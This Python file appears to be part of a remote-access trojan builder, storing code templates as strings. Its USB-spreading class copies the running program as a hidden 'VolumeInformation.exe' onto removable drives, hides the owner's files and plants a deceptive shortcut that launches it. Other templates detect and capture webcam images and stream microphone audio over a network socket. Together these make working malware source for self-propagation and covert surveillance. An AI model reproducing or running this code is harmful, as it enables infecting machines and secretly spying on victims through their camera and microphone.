get_webcam_device = """
try:
    cam = vidcap.new_Dev(0, 0)
    web_camera = str(cam.getdisplayname())
    del cam
except:
    web_camera = 'NoDevice'
"""

get_audio_device = """
try:
    p = pyaudio.PyAudio()
    device_name = p.get_default_input_device_info()
    del p
    audio_input = device_name['name']
except IOError:
    audio_input = 'NoDevice'
"""

initialize_winapi = """
Kernel32 = ctypes.windll.kernel32
User32 = ctypes.windll.user32
Shell32 = ctypes.windll.shell32
Gdi32 = ctypes.windll.gdi32
Psapi = ctypes.windll.psapi
"""

usb_spreading_class = """
class UsbSpread(threading.Thread):

    def run(self):
        while 1:
            bitmask = ctypes.windll.kernel32.GetLogicalDrives()
            for letter in uppercase:
                drive = u'{}:\\'.format(letter)
                if bitmask & 1 and ctypes.windll.kernel32.GetDriveTypeW(drive) == 2:
                    try: os.chdir(drive)
                    except: continue
                    volumeNameBuffer = ctypes.create_unicode_buffer(1024)
                    ctypes.windll.kernel32.GetVolumeInformationW(drive, volumeNameBuffer,
                                                                 ctypes.sizeof(volumeNameBuffer), None, None, None, None,
                                                                 None)
                    HDN_FOLDER = os.path.join(drive, unichr(160)) + '\\'
                    if not os.path.exists(HDN_FOLDER): os.mkdir(HDN_FOLDER)
                    ctypes.windll.kernel32.SetFileAttributesW(HDN_FOLDER, FILE_ATTRIBUTE_HIDDEN)
                    if not os.path.exists(os.path.join(drive, volumeNameBuffer.value + '.lnk')):
                        cmdline = ["cmd", "/q", "/k", "echo off"]
                        cmd = subprocess.Popen(cmdline, stdin=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
                        batch = b''' @echo off
                                echo Set oWS = WScript.CreateObject("WScript.Shell") > CreateShortcut.vbs
                                echo sLinkFile = "%s" >> CreateShortcut.vbs
                                echo Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs
                                echo oLink.TargetPath = "%s" >> CreateShortcut.vbs
                                echo oLink.WorkingDirectory = "%s" >> CreateShortcut.vbs
                                echo oLink.IconLocation = "%s" >> CreateShortcut.vbs
                                echo oLink.Save >> CreateShortcut.vbs
                                cscript CreateShortcut.vbs
                                del CreateShortcut.vbs
                                exit
                                ''' % (
                            os.path.join(drive, volumeNameBuffer.value + '.lnk'),
                            '%CD%\\VolumeInformation.exe',
                            '%CD%',
                            ','.join((os.path.join(os.environ['windir'], 'system32', 'shell32.dll'), '8'))
                        )
                        cmd.stdin.write(batch.encode('utf-8'))
                        cmd.stdin.flush()
                    dst_vir = os.path.join(drive, 'VolumeInformation.exe')
                    if not os.path.exists(dst_vir):
                        shutil.copyfile(sys.argv[0], dst_vir)
                        ctypes.windll.kernel32.SetFileAttributesW(dst_vir, FILE_ATTRIBUTE_HIDDEN)
                    for content in os.listdir(drive):
                        if not content.endswith('.lnk') and not content.endswith('.vbs') and not 'VolumeInformation' in content:
                            try: shutil.move(content, HDN_FOLDER)
                            except: pass
                bitmask >>= 1
            time.sleep(5)
"""

webcam_shot_function = '''
def webcam_shot():
    cam = vidcap.new_Dev(0, 0)
    buff, width, height = cam.getbuffer()
    return str({
        'webcambits': zlib.compress(buff),
        'width': width,
        'height': height,
    })
'''

audio_streaming_class = '''
class AudioStreaming(threading.Thread):
    def __init__(self, sock, rate):
        super(AudioStreaming, self).__init__()

        self.active = True
        self.sock = sock

        self.chunk = 1024
        self.format = pyaudio.paInt16
        self.channel = 1
        self.rate = rate

        self.p = pyaudio.PyAudio()

        self.stream = self.p.open(format=self.format, channels=self.channel, rate=self.rate, input=True,
                                  frames_per_buffer=self.chunk)

    def run(self):
        while self.active:
            try:
                data = self.stream.read(self.chunk)
                self.sock.sendall(data)
            except socket.error:
                self.active = False
                break

        self.stream.close()
        self.p.terminate()
'''